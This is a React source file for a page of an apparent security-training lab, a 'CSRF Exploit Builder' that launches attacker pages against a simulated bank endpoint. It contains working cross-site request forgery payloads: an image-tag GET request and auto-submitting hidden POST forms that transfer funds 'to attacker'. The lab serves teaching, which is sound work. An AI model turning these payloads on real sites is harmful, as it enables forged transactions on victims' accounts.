import { useState, useRef } from "react";
import { useLocation } from "wouter";
import { ChevronRight, RotateCcw, Copy, Check, AlertTriangle } from "lucide-react";
import { motion } from "framer-motion";

const CSRF_PAYLOADS = [
  {
    id: 201,
    label: "GET-based CSRF (Image Tag)",
    payload: `<img src="/api/lab/csrf/transfer?to=attacker&amount=9999">`,
    desc: "Browser auto-loads the image, silently triggering a GET request with the victim's session.",
    note: "In this lab, GET transfers are not enabled — use POST form below.",
  },
  {
    id: 202,
    label: "Auto-submit POST Form",
    payload: `<form id="x" action="/api/lab/csrf/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="5000">
</form>
<script>document.getElementById('x').submit()</script>`,
    desc: "A hidden form on attacker's page auto-submits on load, draining the victim's account.",
    note: "Host this on any domain — no CSRF token means it will work.",
  },
];

export default function LabCsrf() {
  const [, setLocation] = useLocation();
  const [iframeKey, setIframeKey] = useState(0);
  const [copiedId, setCopiedId] = useState<number | null>(null);
  const [attackHtml, setAttackHtml] = useState("");
  const [attackIframeKey, setAttackIframeKey] = useState(0);

  const handleCopy = (id: number, payload: string) => {
    navigator.clipboard.writeText(payload);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 1800);
  };

  const launchAttack = () => {
    setAttackIframeKey((k) => k + 1);
  };

  const handleReset = async () => {
    await fetch("/api/lab/csrf/reset", { method: "POST" }).catch(() => {});
    setIframeKey((k) => k + 1);
    setAttackIframeKey(0);
    setAttackHtml("");
  };

  const attackPageSrc = attackHtml
    ? `data:text/html,${encodeURIComponent(attackHtml)}`
    : null;

  return (
    <div className="h-screen bg-background text-foreground font-mono flex flex-col overflow-hidden">
      {/* Top Bar */}
      <div className="border-b border-border flex items-center justify-between px-4 py-2 flex-shrink-0 bg-background">
        <div className="flex items-center gap-4">
          <button className="text-primary font-bold tracking-widest glitch text-lg" onClick={() => setLocation("/")} data-testid="logo-link">
            41M4
          </button>
          <span className="text-border">|</span>
          <div className="flex items-center gap-2 text-xs text-muted-foreground">
            <button onClick={() => setLocation("/lab")} className="hover:text-primary transition-colors">attack-box</button>
            <ChevronRight className="w-3 h-3" />
            <span className="text-primary font-bold">[CSRF] CROSS-SITE REQUEST FORGERY</span>
          </div>
        </div>
        <button onClick={handleReset} className="text-xs px-2 py-1 border border-border/50 text-muted-foreground hover:text-orange-400 hover:border-orange-400/50 transition-all flex items-center gap-1" data-testid="btn-reset">
          <RotateCcw className="w-3 h-3" />
        </button>
      </div>

      {/* Main Split */}
      <div className="flex flex-1 overflow-hidden">
        {/* Left: Two iframes stacked */}
        <div className="flex-1 flex flex-col border-r border-border min-w-0">
          {/* Victim Bank */}
          <div className="bg-card/50 border-b border-border px-3 py-1.5 flex items-center gap-2 flex-shrink-0">
            <div className="w-2 h-2 rounded-full bg-red-500"></div>
            <div className="w-2 h-2 rounded-full bg-yellow-500"></div>
            <div className="w-2 h-2 rounded-full bg-green-500"></div>
            <span className="text-xs text-primary ml-1 font-bold">VICTIM</span>
            <span className="text-xs text-muted-foreground">/api/lab/csrf/bank</span>
          </div>
          <iframe key={iframeKey} src="/api/lab/csrf/bank" className="h-1/2 w-full border-none bg-[#050505] border-b border-border" title="CSRF Victim" data-testid="victim-iframe" />

          {/* Attacker Page */}
          <div className="bg-card/50 border-b border-border px-3 py-1.5 flex items-center gap-2 flex-shrink-0">
            <div className="w-2 h-2 rounded-full bg-red-500"></div>
            <div className="w-2 h-2 rounded-full bg-yellow-500"></div>
            <div className="w-2 h-2 rounded-full bg-green-500"></div>
            <span className="text-xs text-red-400 ml-1 font-bold">ATTACKER PAGE</span>
            <span className="text-xs text-muted-foreground">simulated malicious origin</span>
          </div>
          <div className="h-1/2 flex flex-col">
            {attackIframeKey > 0 && attackPageSrc ? (
              <iframe key={attackIframeKey} src={attackPageSrc} className="flex-1 w-full border-none bg-[#050505]" title="Attacker Page" data-testid="attacker-iframe" />
            ) : (
              <div className="flex-1 flex items-center justify-center text-muted-foreground/30 text-xs text-center p-4">
                {"// Attacker page renders here when you click [LAUNCH ATTACK] //"}
              </div>
            )}
          </div>
        </div>

        {/* Right: Panel */}
        <div className="w-[400px] flex-shrink-0 flex flex-col overflow-hidden">
          <div className="border-b border-border px-3 py-2.5 flex-shrink-0">
            <div className="text-xs font-bold text-primary tracking-wider">CSRF EXPLOIT BUILDER</div>
            <div className="text-xs text-muted-foreground mt-0.5">Select a template, customize, then launch the attack page</div>
          </div>

          <div className="flex-1 overflow-y-auto p-3 flex flex-col gap-3">
            {/* Payload Templates */}
            <div className="text-xs text-muted-foreground/70 tracking-wider">— TEMPLATES —</div>
            {CSRF_PAYLOADS.map((p, i) => (
              <motion.div
                key={p.id}
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                transition={{ delay: i * 0.07 }}
                className="border border-border/50 p-3 hover:border-primary/30 transition-colors"
              >
                <div className="flex items-center justify-between mb-1">
                  <span className="text-xs font-bold">{p.label}</span>
                  <button
                    onClick={() => handleCopy(p.id, p.payload)}
                    className="text-muted-foreground hover:text-primary p-1"
                    data-testid={`copy-${p.id}`}
                  >
                    {copiedId === p.id ? <Check className="w-3 h-3 text-primary" /> : <Copy className="w-3 h-3" />}
                  </button>
                </div>
                <p className="text-xs text-muted-foreground mb-2 leading-relaxed">{p.desc}</p>
                <p className="text-xs text-orange-400/70 mb-2 italic">{p.note}</p>
                <button
                  onClick={() => setAttackHtml(p.payload)}
                  className="text-xs bg-primary/10 text-primary border border-primary/30 px-3 py-1 hover:bg-primary hover:text-background transition-all w-full"
                  data-testid={`use-template-${p.id}`}
                >
                  [USE TEMPLATE]
                </button>
              </motion.div>
            ))}

            {/* Custom Editor */}
            <div className="text-xs text-muted-foreground/70 tracking-wider mt-1">— CUSTOM ATTACK PAGE HTML —</div>
            <textarea
              value={attackHtml}
              onChange={(e) => setAttackHtml(e.target.value)}
              placeholder={`<!-- craft your CSRF payload here -->\n<form action="/api/lab/csrf/transfer" method="POST">\n  <input type="hidden" name="to" value="attacker">\n  <input type="hidden" name="amount" value="9999">\n</form>\n<script>document.forms[0].submit()</script>`}
              className="bg-card border border-border text-primary font-mono text-xs p-2 resize-none h-36 outline-none focus:border-primary w-full"
              data-testid="attack-html-editor"
            />
            <button
              onClick={launchAttack}
              disabled={!attackHtml.trim()}
              className="text-xs bg-red-900/50 text-red-400 border border-red-500/40 px-4 py-2 font-bold hover:bg-red-900 hover:text-red-300 transition-all tracking-wider disabled:opacity-30 disabled:cursor-not-allowed"
              data-testid="btn-launch-attack"
            >
              [LAUNCH ATTACK PAGE]
            </button>
            <p className="text-xs text-muted-foreground/40 text-center">
              After launching, refresh the victim panel to see the effect
            </p>
          </div>

          <div className="border-t border-border px-3 py-1.5 flex items-center justify-between flex-shrink-0 bg-card/30">
            <div className="flex items-center gap-2 text-xs text-muted-foreground">
              <span className="text-green-500">●</span><span>TARGET LIVE</span>
            </div>
            <div className="flex items-center gap-2 text-xs text-muted-foreground">
              <AlertTriangle className="w-3 h-3 text-orange-400" /><span>AUTHORIZED USE ONLY</span>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
